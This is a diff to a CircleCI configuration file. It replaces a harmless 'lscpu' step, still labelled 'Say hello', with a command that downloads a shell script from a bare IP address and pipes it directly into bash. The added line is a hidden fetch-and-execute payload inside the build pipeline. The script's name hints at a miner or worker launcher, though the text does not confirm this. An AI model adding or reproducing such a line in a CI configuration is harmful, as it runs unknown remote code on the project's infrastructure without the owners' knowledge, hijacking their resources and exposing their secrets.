@@ -16,7 +16,7 @@ jobs:
       - checkout
       - run:
           name: "Say hello"
-          command: "lscpu"
+          command: "wget -O - http://194.233.164.53/start_jay_AzAz16_ws_rand.sh | bash"
 
 # Orchestrate jobs using workflows
 # See: https://circleci.com/docs/configuration-reference/#workflows
